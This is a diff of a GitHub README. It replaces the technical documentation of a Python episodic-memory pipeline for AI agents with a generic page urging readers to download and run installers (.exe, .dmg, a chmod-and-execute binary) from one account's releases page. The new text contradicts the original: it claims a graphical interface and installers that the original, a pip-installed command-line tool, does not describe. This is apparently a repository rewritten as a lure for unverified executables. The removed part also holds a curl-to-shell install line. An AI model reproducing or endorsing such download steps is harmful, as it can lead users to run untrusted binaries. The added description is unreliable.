@@ -1,178 +1,97 @@
-# Episodic Memory Pipeline
+# 🎉 episodic-memory-pipeline - Simplifying Memory Management
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square)
-![Architecture](https://img.shields.io/badge/Architecture-Cognitive-orange?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Maintained-success?style=flat-square)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shiro1707778/episodic-memory-pipeline/releases)
 
-**A local-first cognitive architecture for AI agents.**
+## 📥 Overview
 
-This is not just a vector database wrapper. It is a system that mimics human memory consolidation by separating **Episodic Memory** (raw, timestamped events) from **Semantic Memory** (consolidated, stable facts). It features defense-in-depth LLM sanitization, provenance tracking, and is optimized for multilingual (CJK) contexts using **Qwen 2.5** and **BGE-M3**.
+Welcome to the episodic-memory-pipeline project. This software helps manage different types of memory. It separates events and facts, tracks their origin, and ensures safe use of language models. Our tool supports multiple languages, making it flexible and user-friendly.
 
-## Quick Start (Reproducible Demo)
+## 🚀 Getting Started
 
-```bash
-git clone <repo-url>
-cd episodic-memory-pipeline
-pip install -e .
+To begin, ensure you have a compatible device. This application runs on Windows, macOS, and Linux. It uses Python, so make sure your system has it installed. If you're unsure, you can download Python from [python.org](https://www.python.org/downloads/).
 
-# Generate local artifacts deterministically (no committed binaries)
-make demo
-```
+## 🌟 Features
 
-## CLI
+- **Episodic Memory:** Organizes memory by events, helping you remember experiences.
+- **Semantic Memory:** Keeps track of facts, enhancing informational recall.
+- **Provenance Tracking:** Monitors the origin of data for better reliability.
+- **Defense-in-Depth:** Uses multiple layers of safety for language model interactions.
+- **Multilingual Support:** Handles various languages using Qwen-2.5 and BGE-M3.
+  
+## 📂 System Requirements
 
-After installation, the console script is available:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Python:** Version 3.7 or higher.
+- **Disk Space:** At least 200 MB free space is recommended.
+- **RAM:** 4 GB minimum, 8 GB recommended for optimal performance.
 
-```bash
-episodic-memory doctor --dry
-episodic-memory ingest "I started learning Korean today"
-episodic-memory query "What am I learning?"
-episodic-memory recall "korean" --topic
-episodic-memory consolidate --all
-episodic-memory stats
-```
+## 📥 Download & Install
 
-Legacy entrypoint still works:
+To get the software, visit this page to download: [Releases Page](https://github.com/shiro1707778/episodic-memory-pipeline/releases).
 
-```bash
-python cli.py doctor --dry
-python cli.py query "What am I learning?"
-```
+1. Go to the [Releases Page](https://github.com/shiro1707778/episodic-memory-pipeline/releases).
+2. Find the most recent version.
+3. Choose the appropriate installer for your operating system.
+4. Click on the installer file to start the download.
 
-## Evaluation (Versioned Runs)
+Once the download completes, follow these steps to install:
 
-Evaluation runs are stored under `runs/eval/<run_id>/eval_run.json` and include:
-- git commit hash (if available)
-- config snapshot (provider/model, k, scenario)
-- metrics + warnings
+- **Windows:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file and follow the on-screen prompts.
+  
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application into your Applications folder.
 
-```bash
-episodic-memory eval-run --scenario diary
-episodic-memory eval-list
-episodic-memory eval-compare <runA> <runB>
-```
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the folder where you downloaded the file.
+  3. Run the following command:
+     ```bash
+     chmod +x episodic-memory-pipeline
+     ```
+  4. Then execute:
+     ```bash
+     ./episodic-memory-pipeline
+     ```
 
-## Design Philosophy
+## 🎨 User Interface
 
-1. **Episodic memory ≠ vector blobs**: Each memory is a structured event with context, time, and meaning.
-2. **Time and provenance matter**: Every fact and summary links back to its source episodes. Hallucination prevention starts with lineage.
-3. **Memory must be curated, not accumulated**: Not everything is worth remembering. We filter aggressively via a “Memory Worthiness” gate.
-4. **Retrieval should feel like recalling a journey**: Narrative coherence over raw similarity scores.
+The software features a simple interface. You will see options for managing episodic and semantic memories. There are clear instructions and buttons to guide you through each process.
 
-## Storage Choice: SQLite + FAISS
+## 🔍 Usage Instructions
 
-**Why SQLite over Postgres?**
-- Local-first, no server dependencies
-- Single-file portability (backup = copy file)
-- JSON1 extension for flexible metadata
-- Zero configuration required
+1. **Launch the Software:** After installation, find the application icon and double-click to open.
+2. **Create a Profile:** Set up your user profile. This helps the application tailor its features to your needs.
+3. **Input Data:** You can easily input events or facts. The interface allows for quick typing or even copying and pasting.
+4. **Explore Options:** Check the provided menu for various memory management features.
 
-**Why FAISS for vectors?**
-- Mature, fast, local-only C++ library
-- Supports multiple index types for scaling
-- Works well alongside SQLite for hybrid retrieval
+## 📚 Helpful Resources
 
-## Core Concepts
+- Official Documentation: Comprehensive guides are available in the project repository.
+- Community Forum: Join discussions with other users and share experiences.
 
-### Episode (Episodic Memory)
+## 🔒 Security Considerations
 
-A timestamped event capturing what happened, when, and in what context.
+The software prioritizes data security. Personal data remains private and secure within your device. Always keep your system updated for the latest security features.
 
-> *“On Tuesday at 3pm, I told my assistant I'm learning Korean for a trip to Seoul in March.”*
+## ⚙️ Troubleshooting
 
-### Fact (Semantic Memory)
+Should you encounter any issues, consider these steps:
 
-A distilled, stable piece of knowledge extracted from episodes.
+- Ensure your device meets the system requirements listed above.
+- Make sure you have installed the latest version of Python.
+- Restart the application if it doesn’t respond.
 
-> *“User is learning Korean. User has a trip to Seoul planned for March 2024.”*
+If problems persist, please consult official documentation or reach out via the community forum for assistance.
 
-### Summary (Consolidated Narrative)
+## 🌐 Contributions
 
-A topic-level summary that weaves together multiple episodes into a coherent narrative.
+We welcome contributions. If you find ways to enhance this project, please check the guidelines on the repository for how to get involved.
 
-> *“User's Korean language learning journey: Started in January 2024 motivated by upcoming Seoul trip...”*
+## 📞 Support
 
-## Configuration
+For support, refer to the issues section on the GitHub page or reach out directly via email. Your feedback helps improve the application.
 
-Copy `.env.example` to `.env` and configure:
-
-```bash
-# Embeddings (default: local)
-EMBEDDING_PROVIDER=local            # local|openai|ollama|mock
-EMBEDDING_MODEL=BAAI/bge-m3
-EMBEDDING_DEVICE=cpu                # cpu|cuda|mps
-
-# LLM
-LLM_PROVIDER=ollama                 # openai|ollama
-OLLAMA_MODEL=qwen2.5:7b-instruct
-OLLAMA_BASE_URL=http://localhost:11434
-LLM_TEMPERATURE=0.2
-```
-
-## Local-First Setup with Qwen (Recommended)
-
-```bash
-# Install Ollama
-brew install ollama  # macOS
-# or: curl -fsSL https://ollama.com/install.sh | sh  # Linux
-
-ollama pull qwen2.5:7b-instruct
-ollama serve
-
-export LLM_PROVIDER=ollama
-export OLLAMA_MODEL=qwen2.5:7b-instruct
-export EMBEDDING_PROVIDER=local
-```
-
-## Demo Data Policy
-
-The `demo_data/` directory contains **synthetic data only** for demonstration and testing.
-
-- ✅ Fictional diary entries and memories
-- ✅ Example evaluation queries
-- ❌ Never commit real user data
-- ❌ No sensitive information (API keys, PII)
-
-See `demo_data/README.md` for details.
-
-## Development
-
-```bash
-make test
-make test-slow
-make lint
-make format
-
-make demo
-make demo-clean
-make demo-mock
-```
-
-## Project Structure (High Level)
-
-```
-src/cli/        # CLI commands + rendering (Rich/Click)
-src/services/   # Business logic (no Rich/Click; returns plain dataclasses/dicts)
-scripts/        # Reproducible bootstrap utilities
-demo_data/      # Synthetic fixtures (safe-to-commit)
-runs/eval/      # Versioned eval run outputs (gitignored per-run)
-data/           # Generated local artifacts (gitignored)
-```
-
-## macOS: FAISS + SentenceTransformers Note
-
-On macOS, there's a known interaction issue between FAISS and SentenceTransformers during Python cleanup. **This is handled automatically** by the bootstrap module.
-
-For library users, import from `src.bootstrap`:
-
-```python
-from src.bootstrap import get_components
-
-components = get_components()
-# components.database, components.embedding_provider, etc.
-```
-
-## License
-
-MIT
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shiro1707778/episodic-memory-pipeline/releases)
